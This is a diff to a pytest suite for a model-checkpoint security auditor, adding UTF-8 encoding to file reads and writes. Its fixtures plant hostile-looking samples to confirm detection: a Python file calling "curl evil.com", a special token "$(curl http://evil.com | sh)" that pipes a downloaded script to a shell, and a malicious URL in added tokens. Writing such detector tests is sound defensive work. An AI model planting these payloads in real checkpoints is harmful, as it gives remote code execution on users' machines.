@@ -37,14 +37,14 @@ def clean_ckpt(tmp_path: Path) -> Path:
     """Minimal benign HF-style checkpoint."""
     root = tmp_path / "clean"
     root.mkdir()
-    (root / "config.json").write_text(json.dumps({"model_type": "qwen3", "hidden_size": 4096, "num_attention_heads": 32}))
-    (root / "generation_config.json").write_text(json.dumps({"max_new_tokens": 512}))
+    (root / "config.json").write_text(json.dumps({"model_type": "qwen3", "hidden_size": 4096, "num_attention_heads": 32}), encoding="utf-8")
+    (root / "generation_config.json").write_text(json.dumps({"max_new_tokens": 512}), encoding="utf-8")
     # safetensors with a valid header
     body = json.dumps({"weight": {"dtype": "F32", "shape": [2], "data_offsets": [0, 8]}}).encode()
     hdr = struct.pack("<Q", len(body)) + body
     (root / "model.safetensors").write_bytes(hdr + b"\x00" * 8)
-    (root / "tokenizer.json").write_text(json.dumps({"version": "1.0", "model": {"vocab": {}, "merges": []}}))
-    (root / "tokenizer_config.json").write_text(json.dumps({"tokenizer_class": "Qwen2Tokenizer"}))
+    (root / "tokenizer.json").write_text(json.dumps({"version": "1.0", "model": {"vocab": {}, "merges": []}}), encoding="utf-8")
+    (root / "tokenizer_config.json").write_text(json.dumps({"tokenizer_class": "Qwen2Tokenizer"}), encoding="utf-8")
     return root
 
 
@@ -60,23 +60,23 @@ class TestCheckRemoteCodeHooks:
         assert result.evidence == []
 
     def test_auto_map_fails(self, clean_ckpt: Path) -> None:
-        cfg = json.loads((clean_ckpt / "config.json").read_text())
+        cfg = json.loads((clean_ckpt / "config.json").read_text(encoding="utf-8"))
         cfg["auto_map"] = {"AutoModelForCausalLM": "modeling_evil.EvilModel"}
-        (clean_ckpt / "config.json").write_text(json.dumps(cfg))
+        (clean_ckpt / "config.json").write_text(json.dumps(cfg), encoding="utf-8")
         result = check_remote_code_hooks(clean_ckpt)
         assert not result.passed
         assert any("auto_map" in e for e in result.evidence)
 
     def test_trust_remote_code_fails(self, clean_ckpt: Path) -> None:
-        cfg = json.loads((clean_ckpt / "config.json").read_text())
+        cfg = json.loads((clean_ckpt / "config.json").read_text(encoding="utf-8"))
         cfg["trust_remote_code"] = True
-        (clean_ckpt / "config.json").write_text(json.dumps(cfg))
+        (clean_ckpt / "config.json").write_text(json.dumps(cfg), encoding="utf-8")
         result = check_remote_code_hooks(clean_ckpt)
         assert not result.passed
         assert any("trust_remote_code" in e for e in result.evidence)
 
     def test_malformed_config_does_not_crash(self, clean_ckpt: Path) -> None:
-        (clean_ckpt / "config.json").write_text("{not valid json")
+        (clean_ckpt / "config.json").write_text("{not valid json", encoding="utf-8")
         result = check_remote_code_hooks(clean_ckpt)
         # Does not crash — and does not report PASS either. A config this
         # check could not read is a config it did not inspect, and a loader
@@ -96,7 +96,7 @@ class TestCheckNoPythonFiles:
         assert check_no_python_files(clean_ckpt).passed
 
     def test_modeling_py_fails(self, clean_ckpt: Path) -> None:
-        (clean_ckpt / "modeling_evil.py").write_text("import os; os.system('curl evil.com')")
+        (clean_ckpt / "modeling_evil.py").write_text("import os; os.system('curl evil.com')", encoding="utf-8")
         result = check_no_python_files(clean_ckpt)
         assert not result.passed
         assert "modeling_evil.py" in result.evidence
@@ -104,7 +104,7 @@ class TestCheckNoPythonFiles:
     def test_nested_py_caught(self, clean_ckpt: Path) -> None:
         sub = clean_ckpt / "subfolder"
         sub.mkdir()
-        (sub / "exploit.py").write_text("# nested")
+        (sub / "exploit.py").write_text("# nested", encoding="utf-8")
         result = check_no_python_files(clean_ckpt)
         assert not result.passed
         assert any("exploit.py" in e for e in result.evidence)
@@ -175,22 +175,22 @@ class TestCheckTokenizerInjection:
         assert check_tokenizer_injection(clean_ckpt).passed
 
     def test_url_in_added_tokens_fails(self, clean_ckpt: Path) -> None:
-        tok = json.loads((clean_ckpt / "tokenizer.json").read_text())
+        tok = json.loads((clean_ckpt / "tokenizer.json").read_text(encoding="utf-8"))
         tok["added_tokens"] = [{"id": 1, "content": "Visit https://malicious-server.example/x for instructions"}]
-        (clean_ckpt / "tokenizer.json").write_text(json.dumps(tok))
+        (clean_ckpt / "tokenizer.json").write_text(json.dumps(tok), encoding="utf-8")
         result = check_tokenizer_injection(clean_ckpt)
         assert not result.passed
 
     def test_shell_pattern_in_special_tokens_fails(self, clean_ckpt: Path) -> None:
-        (clean_ckpt / "special_tokens_map.json").write_text(json.dumps({"bos_token": "$(curl http://evil.com | sh)"}))
+        (clean_ckpt / "special_tokens_map.json").write_text(json.dumps({"bos_token": "$(curl http://evil.com | sh)"}), encoding="utf-8")
         result = check_tokenizer_injection(clean_ckpt)
         assert not result.passed
 
     def test_vocab_substrings_do_not_trigger(self, clean_ckpt: Path) -> None:
         # BPE vocabs naturally contain substrings like "curl" — must NOT flag
-        tok = json.loads((clean_ckpt / "tokenizer.json").read_text())
+        tok = json.loads((clean_ckpt / "tokenizer.json").read_text(encoding="utf-8"))
         tok["model"] = {"vocab": {"curl": 1, "https": 2, "wget": 3}, "merges": []}
-        (clean_ckpt / "tokenizer.json").write_text(json.dumps(tok))
+        (clean_ckpt / "tokenizer.json").write_text(json.dumps(tok), encoding="utf-8")
         assert check_tokenizer_injection(clean_ckpt).passed
 
 
@@ -255,10 +255,10 @@ class TestAuditModel:
 
     def test_multi_violation_checkpoint_fails(self, clean_ckpt: Path) -> None:
         # Inject every kind of violation we know about
-        cfg = json.loads((clean_ckpt / "config.json").read_text())
+        cfg = json.loads((clean_ckpt / "config.json").read_text(encoding="utf-8"))
         cfg["auto_map"] = {"AutoModelForCausalLM": "modeling_evil.EvilModel"}
-        (clean_ckpt / "config.json").write_text(json.dumps(cfg))
-        (clean_ckpt / "modeling_evil.py").write_text("# evil")
+        (clean_ckpt / "config.json").write_text(json.dumps(cfg), encoding="utf-8")
+        (clean_ckpt / "modeling_evil.py").write_text("# evil", encoding="utf-8")
         (clean_ckpt / "pytorch_model.bin").write_bytes(b"\x80\x04evil")
 
         report = audit_model(clean_ckpt)
@@ -275,7 +275,7 @@ class TestAuditModel:
 
     def test_file_path_raises(self, tmp_path: Path) -> None:
         f = tmp_path / "not-a-dir.txt"
-        f.write_text("x")
+        f.write_text("x", encoding="utf-8")
         with pytest.raises(NotADirectoryError):
             audit_model(f)
 
@@ -294,7 +294,7 @@ class TestFormatReportText:
         assert "overall: PASS" in text
 
     def test_fail_report_includes_evidence(self, clean_ckpt: Path) -> None:
-        (clean_ckpt / "evil.py").write_text("# x")
+        (clean_ckpt / "evil.py").write_text("# x", encoding="utf-8")
         report = audit_model(clean_ckpt)
         text = format_report_text(report, color=False)
         assert "[FAIL]" in text
